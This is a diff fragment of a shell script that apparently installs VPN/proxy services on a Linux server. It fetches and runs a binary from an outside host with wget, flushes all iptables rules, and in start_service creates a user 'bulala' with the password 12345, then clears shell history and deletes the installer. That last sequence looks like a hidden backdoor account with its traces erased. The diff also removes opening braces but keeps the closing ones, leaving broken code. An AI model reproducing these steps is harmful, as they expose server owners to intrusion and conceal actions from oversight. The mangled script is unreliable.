@@ -131,10 +131,7 @@ service apache2 restart
 }
 
 modify_badvpn(){
-
 clear
-echo 'modifying badvpn'
-{
 wget -O /usr/bin/badvpn-udpgw "https://apk.admin-boyes.com/setup/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
@@ -147,14 +144,14 @@ echo "net.ipv4.ip_forward=1
 net.ipv4.conf.all.rp_filter=0
 net.ipv4.conf.eth0.rp_filter=0" >> /etc/sysctl.conf
 sysctl -p
-{
+
 iptables -F
 iptables-save > /etc/iptables_rules.v4
 ip6tables-save > /etc/iptables_rules.v6
 }
 
 install_rclocal(){
-{
+
 echo "[Unit]
 Description=tknetwork service
 Documentation=http://teamkidlat.com
@@ -912,8 +909,6 @@ startdns
 
 start_service(){
 clear
-echo 'Installing proxy.'
-{
 /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
 history -c;
 rm ~/install_server.sh
